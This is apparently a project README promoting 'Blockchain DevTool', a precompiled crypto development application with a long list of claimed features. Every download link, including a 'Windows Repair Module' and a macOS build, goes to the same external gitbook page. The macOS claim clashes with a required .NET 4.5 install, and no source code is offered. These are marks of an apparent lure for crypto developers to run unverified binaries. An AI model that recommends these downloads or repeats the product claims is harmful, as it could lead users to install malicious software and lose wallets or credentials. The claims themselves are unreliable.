# About
> Blockchain DevTool is a powerful application for blockchain developers. It allows you to create and test smart contracts, manage transactions, simulate cross-chain interactions and analyze blockchain data. 
> Supports Ethereum, Binance Smart Chain, Polygon, Solana, Avalanche and other networks. 
> Local operation via RPC ensures security and speed of development. Unique smart contract builder, node management and AI-assistant help to accelerate the development of crypto projects. The simplicity of the interface and minimalism make the tool an ideal choice for professionals. Save time and test blockchain applications without spending gas.

# Download
>Work on macOS and Windows

1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)

2: Install Actual Precompile Release x32 / x64 👇

Windows x64: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/download)

Windows x32: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/download)

Windows MSI Package: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/download)

Windows Repair Module: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/download)

MAC OS: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/download)

# Unique features
## 1. Visual Smart Contract Builder (Smart Contract Builder)****
- Ability to create smart contracts via drag-and-drop interface (e.g. if/else logic, token management, DAO).
- Optimized code generation (Solidity, Rust or other network dependent language).
- Automatic vulnerability scanning (integration with OpenZeppelin and Slither).

## 2. Interaction Scenario Generator (DApp Flow Simulator)
- A tool for creating custom scripts for interacting with a DApp.
- Visualization: transactions, contract interactions, balance changes.
- Full integration with test networks (e.g. Ethereum Goerli, Polkadot Westend).

## 3. Crosschain Lab (Crosschain Lab)
- A tool for testing crosschain functionality.
- Network support: Ethereum, BNB Chain, Polkadot, Cosmos, etc.
- Automated modeling of interactions between blockchains (e.g., exchanging assets across bridges).

## 4. Quick infrastructure setup (Node & RPC Manager)
- One-click deployment of nodes (full/light) on local machine or in the cloud.
- Built-in node monitoring: performance, workload, synchronization status.
- Generate custom RPC endpoints for applications.

## 5. Integration with team tools (Team Collaboration Hub)
- Built-in task management system (similar to Trello, but customized for smart contract development).
- Collaborate on contracts in real time (edits, reviews, commits).
- Built-in chat with GitHub/GitLab integration.

## 6. Detailed analytics and simulations (On-Chain Analyzer)
- Analyze real-time data from public and private networks.
- Identifying contract performance bottlenecks.
- Ability to run network load simulations for scalability testing.

## 7. Token ecosystem and NFT (Tokenomics Wizard)
- Builder for creating tokens (ERC-20, ERC-721, ERC-1155, etc.).
- Tools for testing tokenomics models: inflation, deflation, and combustion mechanisms.
- Visualization of economic scenarios: supply/demand graphs, price forecasts.

## 8. DAO support
- Creating and managing DAOs.
- Built-in editor for voting, vote allocation rules and fund management.
- Automatic integration with major management platforms (Aragon, Snapshot).

## 9. AI Dev Assistant (AI Dev Assistant)
- Smart contract code generation based on user description.
- Automatic correction of errors in code.
- Recommendations for improving tokenomics or contract logic.

## 10. Gamification of the development process
- Achievement system for completing tasks (e.g., "Deployed first contract", "Successfully modeled a DApp").
- Map the progress of project development.

# Main objectives of the program
> The program is designed to help blockchain developers and crypto projects work with blockchains, test smart contracts, execute transactions and analyze blockchain data. This happens locally, without the need to use a web interface.

## How the program interacts with the blockchain
The program connects to the blockchain via RPC (Remote Procedure Call), which is a way of interacting with a blockchain node.

A node is a server that stores and maintains a copy of the blockchain.
  RPC requests are commands that a program sends to the node, such as:
  Get blockchain information.
  Execute a transaction.
  Read or write smart contract data.

Example request:

The program sends an HTTP request with JSON data to the RPC address of a node (e.g. http://127.0.0.1:8545), the node processes the request and returns the result (e.g. account balance).

# Main functions of the program
## Visual smart contract builder
How it works:
 User enters parameters (token name, symbol, total number of tokens).
 The program generates the text of a smart contract in the Solidity language.
 This contract can be copied and deployed on the blockchain via tools such as Remix or Hardhat.

Interaction example: 
You create a smart contract for a token with the parameters MyToken, MTK, 1000000. The program produces a finished code that can be deployed on Ethereum.

## DApp Interaction Simulation
How it works:
  The program creates local "accounts" and allows you to perform transactions between them.
  This is needed for testing without the expense of gas on a real network.

Example interaction:
  Account "Alice" has 100 tokens and "Bob" has 50 tokens.
  You initiate a transaction: transfer 30 tokens from Alice to Bob.
  The program simulates this, updates the balances, and displays the result.

## Crosschain lab
How it works:
  The program simulates token transfers between two blockchains (e.g. Ethereum and Polkadot).
  It simulates the state of balances on each blockchain.

Example interaction:
  "Alice" has 100 tokens on Ethereum and 0 tokens on Polkadot.
  You "send" 50 tokens from Ethereum to Polkadot.
  The program decreases the balance on Ethereum and increases it on Polkadot.

## Node management
How it works:
  The program connects to a blockchain node via RPC.
You can:
  Check if the node is active.
  Send a request to execute a smart contract.
  Get blockchain state data (e.g., current block number).

Example interaction: 
You enter an RPC address (e.g., http://127.0.0.1:8545). The program checks if the node is available and returns its status.

## Analytics and testing
How it works:
  The program retrieves transaction information on the blockchain (e.g. sender, recipient, amount).
  This is useful for analyzing network activity and testing DApps.

Example interaction: 
You specify a block number, and the program returns a list of all transactions in that block, including addresses and amounts.

## AI-assistant
How it works:
The program analyzes the code of a smart contract, finds errors and suggests improvements.

Example interaction: 
You enter a contract that you forgot to mark pragma solidity ^0.8.0. The program reports an error and suggests adding this line.

# Advantages of using the program
## Local work:

  All actions take place on the computer without the need to access web services.
  This is faster and more secure, especially when developing confidential solutions.

## Time saving:

The Smart Contract Builder allows you to generate code instantly.
Transaction simulator and DApp eliminates manual tests.

## Versatility:

  Support for cross-chain interactions.
  Ability to work with different blockchain networks (Ethereum, Polkadot, Binance Smart Chain, etc.).

## Flexibility:

The program is scalable: you can add support for new networks, tokens, and features.

# How the program helps developers
  Accelerates prototyping and testing.
  Simplifies smart contract generation and deployment.
  Allows you to analyze transactions and blocks without deep technical knowledge.
  Reduces the cost of initial tests by eliminating the need for real gas transactions.

